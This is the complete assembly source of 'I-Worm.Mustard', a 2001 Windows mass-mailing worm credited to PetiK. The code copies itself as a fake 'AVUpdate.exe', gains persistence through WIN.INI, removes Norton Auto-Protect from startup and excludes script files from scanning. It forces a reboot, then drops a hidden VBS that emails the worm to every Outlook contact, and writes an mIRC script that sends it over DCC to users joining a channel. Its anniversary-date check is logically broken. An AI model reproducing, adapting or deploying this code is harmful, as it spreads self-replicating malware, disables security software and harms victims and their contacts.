; comment #
; Name : I-Worm.Mustard
; Author : PetiK
; Date : May 10th - 27th
; Size : 7168 bytes
; Action : When the worm is first executed, it will create the key HKCU\Software\[PetiK]. After,
; it will copy itself as Windows\AVUpdate.exe. It alters the run= in the Win.ini file to :
; run=Windows\AVUpdate.exe. It will try to delete the value "Norton Auto-Protect" in the Run key
; of registry. If it succeed, he alter "Exclude.dat" so that the VBS file don't analyze by
; Norton Antivirus. It shows a message box and reboot the computer. Next start, it will creates
; a VBS worm with the attributes "readonly" and "hidden".
; On June 17th, it shows a message box.
; 
; #


.386
jumps
locals
.model flat,stdcall


extrn   CloseHandle:PROC
extrn   CopyFileA:PROC
extrn   CreateFileA:PROC
extrn   DeleteFileA:PROC
extrn   ExitProcess:PROC
extrn   ExitWindowsEx:PROC
extrn   GetFileAttributesA:PROC
extrn   GetModuleFileNameA:PROC
extrn   GetModuleHandleA:PROC
extrn   GetSystemTime:PROC
extrn   GetWindowsDirectoryA:PROC
extrn   lstrcat:PROC
extrn   MessageBoxA:PROC
extrn   RegCreateKeyExA:PROC
extrn   RegOpenKeyExA:PROC
extrn   RegDeleteValueA:PROC
extrn   RegQueryValueExA:PROC
extrn   RegCloseKey:PROC
extrn   SetFileAttributesA:PROC
extrn   SetFilePointer:PROC
extrn   Sleep:PROC
extrn   WinExec:PROC
extrn   WriteFile:PROC
extrn   WritePrivateProfileStringA:PROC




.data
FileHandle  dd ?
RegHandle   dd ?
octets      dd ?
regDisp     dd 0
regResu     dd 0
Dist        dd 0
szNOR       db 50 dup (0)
szOrig      db 50 dup (0)
szWin       db 50 dup (0)
Buffer      db 7Fh dup (0)
BufferSize  dd 7Fh


run     db "run",00h
windows     db "windows",00h
Winini      db "\\WIN.INI",00h
Copie       db "\AVUpdate.exe",00h
filedat     db "\Exclude.dat",00h
email       db "wscript C:\send.vbs",00h
VBS     db "C:\send.vbs",00h
mirc        db "C:\Win.sys",00h
script1     db "C:\mirc\script.ini",00h
script2     db "C:\mirc32\script.ini",00h
script3     db "C:\Program Files\mirc\script.ini",00h
script4     db "C:\Program Files\mirc32\script.ini",00h
CLE     db "Software\[PetiK]",00h
TITRE       db "Install Information",00h
TEXTE       db "Please reboot your computer to finish the installation",00h
CLE_RUN     db "Software\Microsoft\Windows\CurrentVersion\Run",00h
NAV     db "Norton Auto-Protect",00h
CLE_NOR     db "\Software\Symantec\InstalledApps",00h
ValueType   dd 00h
Value       db "NAV",00h
CREE        db "I-Worm.Mustard par PetiK (c)2001",00h
TITRE2      db "I-Worm.Mustard",00h
TEXTE2      db "        Coded By PetiK (c)2001          ",0dh,0ah
        db "",0dh,0ah
        db "Small but Pretty",0dh,0ah
        db "I Love You",0dh,0ah
        db "Since January",0dh,0ah
        db "I Think Of You",00h



HKEY_LOCAL_MACHINE  equ 80000002h
HKEY_CURRNET_USER   equ 80000001h
KEY_ALL_ACCESS      equ 0000003Fh
FILE_ATTRIBUTE_READONLY equ 00000001h
FILE_ATTRIBUTE_HIDDEN   equ 00000002h
FILE_ATTRIBUTE_NORMAL   equ 00000080h
CREATE_NEW      equ 00000001h
CREATE_ALWAYS       equ 00000002h
OPEN_EXISTING       equ 00000003h
FILE_SHARE_READ     equ 00000001h
GENERIC_WRITE       equ 40000000h
FILE_END        equ 00000002h
EWX_REBOOT      equ 00000002h
EWX_FORCE       equ 00000004h

SYSTIME struct
wYear           WORD ?
wMonth          WORD ?
wDayOfWeek      WORD ?
wDay            WORD ?
wHour           WORD ?
wMinute         WORD ?
wSecond         WORD ?
wMillisecond        WORD ?
SYSTIME ends
SystemTime SYSTIME <>


mircd:
db "[script]",0dh,0ah
db "n0=on 1:JOIN:#:{",0dh,0ah
db "n1= /if ( $nick == $me ) { halt }",0dh,0ah
db "n2= ./dcc send $nick "
szCopie     db 50 dup (0)
db "",0dh,0ah
db "n3=}",00h
MIRCTAILLE  equ $-mircd

sendd:
db 'ENTREE()',0dh,0ah
db 'Sub ENTREE',0dh,0ah
db 'EMAIL()',0dh,0ah
db 'End Sub',0dh,0ah
db 'Sub EMAIL()',0dh,0ah
db 'Set K = CreateObject("Outlook.Application")',0dh,0ah
db 'Set L = K.GetNameSpace("MAPI")',0dh,0ah
db 'For Each M In L.AddressLists',0dh,0ah
db 'If M.AddressEntries.Count <> 0 Then',0dh,0ah
db 'For O = 1 To M.AddressEntries.Count',0dh,0ah
db 'Set P = M.AddressEntries(O)',0dh,0ah
db 'Set N = K.CreateItem(0)',0dh,0ah
db 'N.To = P.Address',0dh,0ah
db 'N.Subject = "AntiVirus Update"',0dh,0ah
db 'N.Body = "The last version of your AV"',0dh,0ah
db 'Set Q = CreateObject("Scripting.FileSystemObject")',0dh,0ah
db 'N.Attachments.Add Q.BuildPath(Q.GetSpecialFolder(0),"AVUpdate.exe")',0dh,0ah
db 'N.DeleteAfterSubmit = True',0dh,0ah
db 'If N.To <> "" Then',0dh,0ah
db 'N.Send',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End If',0dh,0ah
db 'Next',0dh,0ah
db 'End Sub',0dh,0ah
SENDTAILLE equ $-sendd

datd:
db 02Ah,02Eh,076h,062h,073h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h
db 000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,000h,001h,0E6h,003h
DATTAILLE equ $-datd

.code
DEBUT:
VERIF:  push offset regDisp
    push offset regResu
    push 00h
    push 0F003Fh
    push 00h
    push 00h                    ; HKCU\Software\[PetiK] exist ?
    push 00h
    push offset CLE
    push HKEY_CURRNET_USER
    call RegCreateKeyExA
    push [regResu]
    call RegCloseKey
    cmp  [regDisp],1
    jne  EMAIL                  ; YES => EMAIL
    
COPIE:  push 00h
    call GetModuleHandleA
    push 50
    push offset szOrig
    push eax
    call GetModuleFileNameA
    push 50
    push offset szCopie
    call GetWindowsDirectoryA
    push offset Copie
    push offset szCopie
    call lstrcat
    push offset szCopie
    push offset szOrig
    call CopyFileA                  ; Copy itself to \WINDIR\AVUpdate.exe

WIN_INI:push 50
    push offset szWin
    call GetWindowsDirectoryA
    push offset Winini
    push offset szWin
    call lstrcat
    push offset szWin               ; Alters the run= line in the WIN.INI
    push offset szCopie
    push offset run
    push offset windows             ; run=\WINDIR\AVUpdate.exe
    call WritePrivateProfileStringA

MIRC1:  push 00h
    push FILE_ATTRIBUTE_READONLY
    push CREATE_ALWAYS
    push 00h
    push FILE_SHARE_READ
        push GENERIC_WRITE
    push offset mirc
    call CreateFileA
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push MIRCTAILLE
    push offset mircd
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle                ; Create a ini script for mIRC
MIRC2:  push 00h
    push offset script1
    push offset mirc
    call CopyFileA                  ; Copy to \mirc
    push 00h
    push offset script2
    push offset mirc
    call CopyFileA                  ; \mirc32
    push 00h
    push offset script3
    push offset mirc
    call CopyFileA                  ; \Program Files\mirc
    push 00h
    push offset script4
    push offset mirc
    call CopyFileA                  ; \Program Files\mirc32
    push offset mirc
    call DeleteFileA                ; and delete the first file


DEL_REG:push offset RegHandle
    push KEY_ALL_ACCESS
    push 00h
    push offset CLE_RUN
    push HKEY_LOCAL_MACHINE
    call RegOpenKeyExA

VAL1:   push offset NAV                 ; Try to delete "Norton Auto-Protect" value
    push [RegHandle]
    call RegDeleteValueA
    test eax,eax
    jnz  EMAIL                  ; NO => jmp EMAIL

    push [RegHandle]
    call RegCloseKey

NORTON: push offset RegHandle
    push 001F0000h
    push 00h    
    push offset CLE_NOR
    push HKEY_LOCAL_MACHINE
    call RegOpenKeyExA
    test eax,eax
    jnz  FIN

    push offset BufferSize
    push offset Buffer
    push offset ValueType
    push 00h                    ; Search the "InstallDir" of Norton
    push offset Value
    push RegHandle
    call RegQueryValueExA

    push [RegHandle]
        call RegCloseKey

TRAFIC: push offset filedat
    push offset Buffer
    call lstrcat
    push offset Buffer
    call GetFileAttributesA
    cmp  eax,FILE_ATTRIBUTE_READONLY        ; Attribute read only for the file ?
    je   FIN                    ; YES => FIN
    push 00h
    push FILE_ATTRIBUTE_NORMAL
    push OPEN_EXISTING
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset Buffer
    call CreateFileA
    cmp  eax,-1
    je   REBOOT                 ; File exist ? NO => jmp REBOOT
    mov  [FileHandle],eax
    push FILE_END
    push 00h
    push [Dist]
    push [FileHandle]   
    call SetFilePointer             ; End of the file
    push 00h
    push offset octets
    push DATTAILLE
    push offset datd
    push [FileHandle]
    call WriteFile                  ; Write datas
    push [FileHandle]
    call CloseHandle

    push 5000
    call Sleep                  ; Wait 5 seconds
    push FILE_ATTRIBUTE_READONLY
    push offset Buffer
    call SetFileAttributesA             ; Attribute read only for the file

MESSAGE:push 40h
    push offset TITRE
    push offset TEXTE
    push 00h
    call MessageBoxA

REBOOT: push EWX_REBOOT or EWX_FORCE
    call ExitWindowsEx

EMAIL:  push 00h
    push FILE_ATTRIBUTE_READONLY or FILE_ATTRIBUTE_HIDDEN
    push CREATE_NEW
    push 00h
    push FILE_SHARE_READ
    push GENERIC_WRITE
    push offset VBS             ; success ? continue 
    call CreateFileA
    cmp  eax,-1
    je   DATE               ; else, jump to label BDR
    mov  [FileHandle],eax
    push 00h
    push offset octets
    push SENDTAILLE
    push offset sendd
    push [FileHandle]
    call WriteFile
    push [FileHandle]
    call CloseHandle

ENVOIE: push 01h
    push offset email
    call WinExec

ATTEND: push 10000
    call Sleep

EFFACE: push offset VBS
    call DeleteFileA

DATE:   push offset SystemTime
    call GetSystemTime
    cmp  [SystemTime.wDay],11h
    jne  FIN
    cmp  [SystemTime.wDay],06h
    jne  FIN
    push 40h
    push offset TITRE2
    push offset TEXTE2
    push 00h
    call MessageBoxA

FIN:    push 00h
    call ExitProcess

end DEBUT
